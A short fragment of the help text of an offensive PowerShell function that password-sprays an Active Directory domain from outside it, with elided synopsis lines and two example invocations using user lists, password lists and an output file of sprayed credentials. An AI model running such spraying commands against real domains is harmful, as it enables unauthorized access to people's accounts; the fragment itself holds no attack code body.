function Invoke-DomainPasswordSprayOutsideTheDomain{
    <#
    .SYNOPSIS
...
Note:
    ...
    When you are in the domain environment,you can use the original file(Invoke-DomainPasswordSpray).
    ...
    C:\PS> Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain "192.168.1.1/DC=test,DC=com" -PasswordList passlist.txt -OutFile sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "192.168.1.1/DC=test,DC=com" using each password in the passlist.txt file one at a time.


    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSprayOutsideTheDomain -Domain "192.168.1.1/DC=test,DC=com" -UserList .\user.txt -Password DomainUser123! -Verbose 
